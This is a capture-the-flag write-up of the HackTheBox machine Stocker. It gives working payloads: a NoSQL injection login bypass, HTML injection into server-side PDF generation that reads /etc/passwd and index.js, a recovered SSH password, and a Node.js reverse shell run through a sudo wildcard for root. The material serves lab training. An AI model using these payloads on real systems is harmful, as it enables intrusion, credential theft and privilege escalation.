---
title: "Stocker - HackTheBox"
description: "https://www.hackthebox.com/machines/Stocker"
summary: "Hack The Box Machine Stocker"
date: 2023-09-27
draft: false
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["Linux", "HackTheBox", "Easy", "CTF"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
# weight: 1
# aliases: ["/first"]
hidemeta: false
comments: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
cover:
    image: "images/cover.webp#center" # image path/url
    alt: "Cover: Stocker Machine Logo" # alt text
    caption: "" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
    # linkFullImages: true
# editPost:
    # URL: "https://github.com/"
    # Text: "Suggest Changes" # edit text
    # appendFilePath: true # to append file path to Edit link
---

![](images/cover.webp#center)

------------------------

### About Stocker
- Stocker is a medium difficulty Linux machine that features a website running on port 80 that advertises various house furniture. 
- Through vHost enumeration the hostname `dev.stocker.htb` is identified and upon accessing it a login page is loaded that seems to be built with `NodeJS`.
- By sending JSON data and performing a `NoSQL` injection, the login page is bypassed and access to an e-shop is granted.
- Enumeration of this e-shop reveals that upon submitting a purchase order, a PDF is crafted that contains details about the items purchased. This functionality is vulnerable to HTML injection and can be abused to read system files through the usage of iframes.
- The `index.js` file is then read to acquire database credentials and owed to password re-use users can log into the system over `SSH`.
- Privileges can then be escalated by performing a path traversal attack on a command defined in the sudoers file, which contains a wildcard for executing `JavaScript` files.


### Scanning

we atart with nmap scan:
```shell
┌──(Jack㉿Sparrow)-[~/Downloads/htb/stocker]
└─$ sudo nmap -sS -sC -T5 10.10.11.196 -oN nmap.txt
[sudo] password for Jack: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 02:18 EDT
Nmap scan report for 10.10.11.196
Host is up (0.68s latency).
Not shown: 938 closed tcp ports (reset), 60 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://stocker.htb

Nmap done: 1 IP address (1 host up) scanned in 29.93 seconds                                                           
```

### Foothold

we have 2 ports open: 22(ssh) , 80(http).

add `stocker.htb` to `/etc/hosts` file.

visiting this page we see one comment from `Angoose Garden, Head of IT at Stockers Ltd.`

next we try to bruteforce subdomains:

```shell
┌──(Jack㉿Sparrow)-[~]
└─$ gobuster vhost -u stocker.htb -w /usr/share/wordlists/dirb/common.txt  --append-domain  -t 100
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/wordlists/dirb/common.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/03/30 02:44:46 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/30 02:45:04 Finished
===============================================================
```

again we need to add `dev.stocker.htb` to `/etc/hosts` file.

#### NoSQL Injection Login bypass

after few try and errors we found that login page is vulnerable to NoSQL Injection.

`Content-Type: application/json`

Payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`

here we can purchase something through api and on view order it will generate pdf or that order.

Since it generates PDF on the server side, let's see if we can include server files.

#### Read local files using PDF generation

Let's try to Read local file.

Path:`api/order` 
Payload:
```json
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<object data='file:///etc/passwd'>","description":"It's a red cup.","image":"/etc/passwd","price":32,"currentStock":4,"__v":0,"amount":1}]}
```
response:
```json
{"success":true,"orderId":"642550c92e188ca84f0a3f46"}
```

we can see generated PDF at `/api/po/642550c92e188ca84f0a3f46`.

<img width="498" alt="image" src="https://user-images.githubusercontent.com/79740895/228787287-27642032-742a-400f-9b1d-e7814137d623.png">

We can modify our payload to increase the view area:

```json
{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"<object data='file:///var/www/dev/index.js' height=800 width=800>","description":"It's a red cup.","image":"Yo","price":32,"currentStock":4,"__v":0,"amount":1}]}
```
result:

<img width="324" alt="image" src="https://user-images.githubusercontent.com/79740895/228790867-552de9df-6da5-4534-a6da-f457149e974b.png">

we found Password: `IHeardPassphrasesArePrettySecure`

previously we show one comment from Angoose Garden, Head of IT at Stockers Ltd.

we can try this username:`Angoose` and password on ssh.


<img width="228" alt="image" src="https://user-images.githubusercontent.com/79740895/228792401-92e175e9-5868-4f29-9276-513a2303d220.png">

### Escalating Privileges

chech root Permission using `sudo -l`

```shell
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Sorry, try again.
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

we can escalate our privilege with node 

Payload:
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect(8888, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

Reference: https://www.revshells.com/

save this as js file and run using sudo and path traversal.

<img width="343" alt="image" src="https://user-images.githubusercontent.com/79740895/228799823-4734593e-c124-4224-ba63-a028a4618805.png">

<img width="200" alt="image" src="https://user-images.githubusercontent.com/79740895/228798809-70c77d3a-894a-4cb9-80fc-49fb48994544.png">

Now we are root.


Happy Hacking
